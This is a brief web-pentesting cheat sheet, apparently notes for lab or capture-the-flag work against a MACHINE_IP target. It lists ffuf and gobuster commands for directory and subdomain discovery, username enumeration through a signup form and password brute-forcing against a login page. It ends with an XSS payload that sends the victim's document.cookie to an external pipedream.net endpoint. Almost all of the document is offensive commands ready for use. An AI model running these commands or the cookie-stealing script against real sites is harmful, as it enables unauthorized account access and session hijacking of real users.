# WEB 

## TOOLS
- **[Hydra](https://www.kali.org/tools/hydra/)** : Logon cracker for many services
- **[ffuf](https://www.kali.org/tools/ffuf/)** : Web Fuzzer
- **[gobuster](https://www.kali.org/tools/gobuster/)** : Web Brute-force tools

## COMMANDS
**Discovery files/folders**
`gobuster dir -u http://MACHINE_IP/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt`

**Enumerate on subdomains**
`ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.DOMAIN" -u http://MACHINE_IP`

**Enumerate on users**
`ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/signup -mr "username already exists"`

**Bruteforce users**
`ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200`

**XSS Cookie Grabber**
`<script> document.write('<IMG SRC=https://en6g6pduwcwd1n.m.pipedream.net?cookie='+document.cookie+'/>')</script>`